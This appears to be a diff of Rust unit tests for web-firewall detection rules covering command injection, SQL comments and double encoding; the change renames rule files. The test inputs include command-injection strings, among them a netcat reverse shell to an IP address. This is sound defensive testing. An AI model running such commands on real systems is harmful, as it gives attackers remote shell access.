@@ -446,7 +446,7 @@ mod tests {
 
     #[test]
     fn command_chaining_ignores_names_that_merely_start_with_a_command() {
-        let re = Regex::new(&pattern("932-rce.toml", 932012)).unwrap();
+        let re = Regex::new(&pattern("932-rce.rules.toml", 932012)).unwrap();
 
         // A Cookie header is semicolon-separated by definition, so these are
         // ordinary traffic. "nc" matching the "nc" of "nc_token" scored 8 of a
@@ -465,7 +465,7 @@ mod tests {
 
     #[test]
     fn command_chaining_still_catches_the_real_thing() {
-        let re = Regex::new(&pattern("932-rce.toml", 932012)).unwrap();
+        let re = Regex::new(&pattern("932-rce.rules.toml", 932012)).unwrap();
         for attack in [
             "; nc -e /bin/sh 10.0.0.1",
             "; ls -la",
@@ -481,7 +481,7 @@ mod tests {
 
     #[test]
     fn double_encoding_means_an_encoded_percent_not_two_escapes() {
-        let re = Regex::new(&pattern("920-protocol.toml", 920002)).unwrap();
+        let re = Regex::new(&pattern("920-protocol.rules.toml", 920002)).unwrap();
 
         // Two escapes in a row is ordinary URL encoding, not an attack. Any
         // character outside ASCII produces several, so this used to score
@@ -504,7 +504,7 @@ mod tests {
 
     #[test]
     fn the_sql_comment_rule_ignores_a_mime_wildcard() {
-        let re = Regex::new(&pattern("942-sqli.toml", 942007)).unwrap();
+        let re = Regex::new(&pattern("942-sqli.rules.toml", 942007)).unwrap();
         // Every HTTP client sends this by default.
         assert!(!re.is_match("*/*"));
         assert!(!re.is_match("text/html, */*;q=0.8"));
